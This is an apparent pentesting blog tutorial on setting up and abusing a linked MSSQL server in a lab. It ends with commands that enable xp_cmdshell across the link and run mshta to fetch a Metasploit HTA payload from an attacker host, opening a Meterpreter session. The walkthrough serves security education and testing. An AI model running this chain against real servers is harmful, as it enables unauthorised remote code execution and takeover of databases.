<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ms-sql-penetration-testing/" rel="category tag">MS-SQL Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">MSSQL for Pentester: Abusing Linked Database</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/mssql-for-pentester-abusing-linked-database/" rel="bookmark"><time class="entry-date published" datetime="2021-09-11T11:57:10+00:00">September 11, 2021</time><time class="updated" datetime="2025-05-10T18:15:25+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This article is another addition to our MSSQL for Pentesters series. In this article, we will learn how to create a linked server and exploit it.</span></p>
<h3><span style="color: #800000;">Table of content</span></h3>
<ul>
<li><strong><span style="color: #000000;">Introduction to Link Servers</span></strong></li>
<li><strong><span style="color: #000000;">Lab Set-Up</span></strong></li>
<li><strong><span style="color: #000000;">Exploiting Link Server</span></strong>
<ul>
<li><span style="color: #000000;">Enumeration</span></li>
<li><span style="color: #000000;">Code Execution with PowerUpSQL &amp; Metasploit</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #800000;">Introduction to Link Servers</span></h3>
<p><span style="color: #000000;">A linked server acts as a bridge between two servers. Through a link, server database can be viewed/shared/edited by two or more servers that have access to the said database. Data from tables can be joined together and queried through it. Linked Servers are designed for applications that need more flexibility over how data is stored and retrieved. Whether the application uses parallel processing, random queries, or joins between multiple Microsoft Access files, a Linked Server provides a better platform for flexible application development. Data from multiple sources can be added to one table or appended to existing data. You can use a Linked Server in place of an ordinary table like you might do when you make a copy of an existing database table.  Following things can be done via a Link Server:</span></p>
<ul>
<li><span style="color: #000000;">Control query plans</span></li>
<li><span style="color: #000000;">Change column data type</span></li>
<li><span style="color: #000000;">Optimize queries on the remote server</span></li>
<li><span style="color: #000000;">Change plan for the local table</span></li>
<li><span style="color: #000000;">Access remote table data</span></li>
<li><span style="color: #000000;">Delete objects on the local database</span></li>
<li><span style="color: #000000;">Change server used to access local tables</span></li>
<li><span style="color: #000000;">Reconnect to a linked server</span></li>
<li><span style="color: #000000;">Use replicated parameters</span></li>
<li><span style="color: #000000;">Allow remote updates</span></li>
</ul>
<h3><span style="color: #800000;">Lab Set-Up</span></h3>
<p><span style="color: #000000;">We will first set up a link server.  When the MSSQL server is installed, a default server is created on its own. But we need another server so that we can link both of them. </span></p>
<h4><span style="color: #000000;">Installing a New SQL Server Instance</span></h4>
<p><span style="color: #000000;">To create another server, launch the installation process and choose New SQL Server Stand-alone installation or add features to an existing installation as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-coPXO-iWOB4/YTyTU4pZ2cI/AAAAAAAAyjo/sIrVt7ORBTsemPt-ekE67ZKtUhUMBFrlACLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Then click on the <strong>Next</strong> button as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Chz8ZM93Yrk/YTyTgSGLRCI/AAAAAAAAyjs/ww2FV8Pd4coH1hzNW79tUR9KlAGw08nawCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">In the next window of the dialogue box, select <strong data-start="253" data-end="302">Perform a new installation of SQL Server 2016</strong>, and then click on the Next button as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-o0ZfeWR8wJA/YTyTmHV5KZI/AAAAAAAAyj0/TzQM61J_ATspUXWhxbTMtzI4J3kh5SFkACLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">At the Feature Selection step, choose the features you want to install and provide the path of your instance. Afterwards, click on the Next button as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gQRgpv7nJr4/YTyTs5HB6kI/AAAAAAAAyj4/DqCv_h0sqA06bSXaaOAyrvk6G-wD87svgCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">When you reach the Instance Configuration dialogue box, enter the name of the server and click on the Next button as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RGMkeWe7aZE/YTyTwrBk0_I/AAAAAAAAyj8/KCvUuifKfGkTi7LZzGbSl-x-qPQwoowTwCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Proceed to the Server Configuration dialogue box, ensure the startup type is set to automatic, and then click on the Next button as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qjqIH7BExws/YTyT2BsCcJI/AAAAAAAAykE/T8mozM5Ne407giHGjQQemaxGNfMcrGRDwCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Finally, at the Database Engine Configuration dialogue box, select <strong data-start="915" data-end="929">Mixed Mode</strong> under Authentication Mode, set your server password, and click on the Next button as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bFJLeTKaSVc/YTyULwBqLGI/AAAAAAAAykM/jWtpmqAsQdAhwvNnql56TDsAeAL-D72hQCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">Click on the <strong>Close</strong> button as the installation is now complete; just like shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oIVAUfMve7w/YTyUQ0M2XOI/AAAAAAAAykQ/jyWEbI-NHsswkj0ajQLiw0Q514bh0m-EQCLcBGAsYHQ/s16000/8.png"/></span></p>
<h4><span style="color: #000000;">Creating and Configuring the Linked Server</span></h4>
<p><span style="color: #000000;">Now to connect to the server, choose the <strong>&lt;Browse for more…&gt;</strong> option in the drop-down menu of <strong>Authentication</strong> as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-V1Bk2zsozI8/YTyUZEN0y7I/AAAAAAAAykU/TCA89m0Y-EA6gq3uR12zoKpmjRejW1ncwCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Choose your server and click on the <strong>OK</strong> button as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oj0WrECwGe8/YTyUkM30k8I/AAAAAAAAykg/Gqlbl1dsuxUkDaB9XqY0BqPePEWXySuLACLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">Now, as you can see in the image below, we have our two servers.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LgEdX8dmAIo/YTyUpinGvbI/AAAAAAAAyko/jDTUUeW8eWwJLlK4s86a-eF1lfTJ2CjIQCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">Now go to the main <strong>server&gt;Servere Objects&gt;Linked Servers</strong>. Right-click on Linked Servers and choose <strong>New Linked Server…</strong> option from the drop-down menu as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sr6xTzIPs24/YTyUuk1j7-I/AAAAAAAAyks/QDNphNW92iwharE0KB-Mc-l6HTBWeDGpQCLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">In the Linked Server option, give the name of the server you want to link. In the <strong>Server Type,</strong> choose the <strong>Other data source</strong>. Choose <strong>Microsoft OLE DB Provider from SQL Server</strong> from the drop-down menu of <strong>Provider</strong>. Give your default server as the data source and give the database name in the <strong>Catalog</strong>. Finally, click on the <strong>OK</strong> button as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xnkeJqGrSAU/YTyUyxcCMyI/AAAAAAAAykw/-3Tsst4pQG8Jo3jzSALqovK4XuzRHahXwCLcBGAsYHQ/s16000/20.png"/></span></p>
<p><span style="color: #000000;">In the Server Options, make sure <strong>RPC and RPC Out</strong> are true, as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-e4rEEiyh6rI/YTyU3wKWL8I/AAAAAAAAyk0/B2rJrY1xLUY6FSQAr5yEZagizyBFopt-QCLcBGAsYHQ/s16000/21.png"/></span></p>
<p><span style="color: #000000;">In the Security tab, give the username and password of your default server, then click on the OK button as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZTqQkXuGgRY/YTyU74YEPSI/AAAAAAAAyk8/tR02D9_HYgg9ycH2HqKd3sG5W-HMGH6kgCLcBGAsYHQ/s16000/22.png"/></span></p>
<p><span style="color: #000000;">After all this, your linked server will be created as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4Y4y5lO3Oi8/YTyVBti4ajI/AAAAAAAAylE/I1_Aceocxzc6gXqL2AAdQ4wlndjLVdoKwCLcBGAsYHQ/s16000/23.png"/></span></p>
<h3><span style="color: #800000;">Exploiting Link Server</span></h3>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<p><span style="color: #000000;">Now our link server is up and ready. As an attacker, we know nothing about the server. So, to enumerate the link server, we will use PowerUpSQL and its following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .\PowerUpSQL.ps1
Get-SQLServerLink -Username sa -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS -Verbose</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-xWFYBjznTzc/YT_GvKe6wlI/AAAAAAAAyn8/lwfiRMp9CwMDtYZVxC2RlK_SK-ju7z0EgCLcBGAsYHQ/s16000/24.png"/></p>
<p><span style="color: #000000;">As you can see in the image above, we have instance name, linked server name, and catalog name, among other helpful information.</span></p>
<p><span style="color: #000000;"><strong>Code Execution</strong></span></p>
<p><span style="color: #000000;">Now, to remotely gain access to the linked server, we will use PowerUpSQL and Metasploit. These two tools have proved to be the best tools when it comes to attacking MSSQL Servers.</span></p>
<p><span style="color: #000000;"> Before we deploy these tools, we can go to facets&gt;surface area configuration and confirm that XPCmdshell is disabled, as shown in the image below:</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-kf3RNd4IT9I/YTyVM3N5ZcI/AAAAAAAAylY/lfHT7oMxl6k2nNCo7CXTiZKJHUk7Zx6igCLcBGAsYHQ/s16000/26.png"/></p>
<p><span style="color: #000000;">Now, we will enable this XPCmdshell by using the following command of PowerUpSQL:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-SQLServerLinkCrawl -Username sa -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;')"</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-OyYR2UmUWVA/YT_HcV3iKCI/AAAAAAAAyoQ/a_khZ9lZruQqeALLuG5aV1hdYnOgMjyGwCLcBGAsYHQ/s16000/27.png"/></p>
<p><span style="color: #000000;">Now that XPCmdshell is enabled, we will use Metasploit to generate a URL with the hta_server exploit, and for this use the following set of commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/misc/hta_server
set srvhost eth0
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7QNywEo-Kw4/YTyVhiq-TEI/AAAAAAAAyl0/kVvmHO0LHCgJaC79xtLR5VFXf0n60cM9ACLcBGAsYHQ/s16000/28.png"/></span></p>
<p><span style="color: #000000;">We have our URL. Now, we will execute this URL via PowerUpSQL so that we can have our Meterpreter session. To deploy the said URL, use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-SQLServerLinkCrawl -Username sa -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS -Query "exec master..xp_cmdshell 'mshta.exe http://192.168.1.2:8080/ugfFOJBvO.hta'"</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-vaX9iZkZIFc/YT_HD2T0qRI/AAAAAAAAyoE/tp69sUYCB-44HvuRaqpYGZT6dZJH-vnMACLcBGAsYHQ/s16000/29.png"/></p>
<p><span style="color: #000000;">Once the command is executed successfully, we will have our meterpreter session as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fRftsTT4UN8/YTyVnhjhxQI/AAAAAAAAyl8/6wQAQ6ekrIcBcviDv7iAvTTMSvdtzGdGACLcBGAsYHQ/s16000/30.png"/></span></p>
<p><span style="color: #000000;">In such a simple way, a linked server can be exploited and give the session to an attacker.</span></p>
<p><strong>Reference</strong>: <span style="color: #0000ff;"><strong>https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-link-crawling-powerupsql/</strong></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Yashika Dhir is a Cyber Security Researcher, Penetration Tester, Red Teamer, Purple Team enthusiast. Contact her on</span> <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/yashika-dhir/">Linkedin</a> </strong></span><span style="color: #000000;">and </span><span style="color: #0000ff;"><strong>Twitter</strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
